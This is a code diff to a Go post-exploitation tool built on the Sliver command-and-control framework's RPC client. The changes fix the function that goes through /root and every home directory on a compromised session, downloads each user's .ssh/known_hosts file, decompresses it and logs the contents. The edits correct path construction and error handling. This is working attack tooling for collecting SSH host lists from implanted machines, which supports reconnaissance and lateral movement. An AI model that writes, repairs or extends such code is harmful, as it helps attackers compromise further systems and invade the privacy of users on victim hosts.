@@ -130,9 +130,10 @@ func download_file(rpc rpcpb.SliverRPCClient, session *clientpb.Session, downloa
 		Path:    download_path,
 		Request: makeRequest(session),
 	})
-	if err != nil {
-		log.Fatalf("download failed: %v", err)
-	}
+    if err != nil {
+        // 将错误返回给调用者，而不是中断程序
+        return nil, fmt.Errorf("download failed: %v", err)
+    }
 	return files, nil
 }
 
@@ -223,7 +224,7 @@ func compressGzipData(uncompressedData string) ([]byte, error) {
 
 func runSearchKnownHosts(rpc rpcpb.SliverRPCClient, session *clientpb.Session) {
 	var KnownHost_list []string
-	KnownHost_list = append(KnownHost_list,"/root/" )
+	KnownHost_list = append(KnownHost_list,"/root" )
 
 	files, err := ls_session_file(rpc, session, "/home/")
 	if err != nil {
@@ -232,23 +233,25 @@ func runSearchKnownHosts(rpc rpcpb.SliverRPCClient, session *clientpb.Session) {
 	for _, file := range files.Files {
 		if file.IsDir  {
 			//log.Printf("%s is directory",file.Name)
-			KnownHost_list = append(KnownHost_list,"/home/." + file.Name )
+			KnownHost_list = append(KnownHost_list,"/home/" + file.Name )
 		} 
 	}
 	for _, known_host := range KnownHost_list {
-		known_host = known_host  + ".ssh/known_hosts"
+		known_host = known_host  + "/.ssh/known_hosts"
 		log.Printf("Starting Downloading files. %s",known_host)
 		known_host_file, err := download_file(rpc,session,known_host)
 		if err != nil {
-			log.Printf("download %s failed: %v", known_host_file, err)
+			log.Println(err)
 			continue
 		} else {
-			fmt.Printf("download success %s\n", known_host_file.Path)
+			log.Printf("download success %s\n", known_host_file.Path)
 			decodedString, err := decompressGzipData(known_host_file.Data)
 			if err != nil {
-				log.Fatal("error decompressing data: %v", err)
+				log.Fatalf("error decompressing data: %v", err)
 			}
-			log.Print("%s content of %s",known_host_file,decodedString)
+			log.Printf("content of %s \n",known_host_file.Path)
+			log.Println(decodedString)
+
 		}
 	}
 }
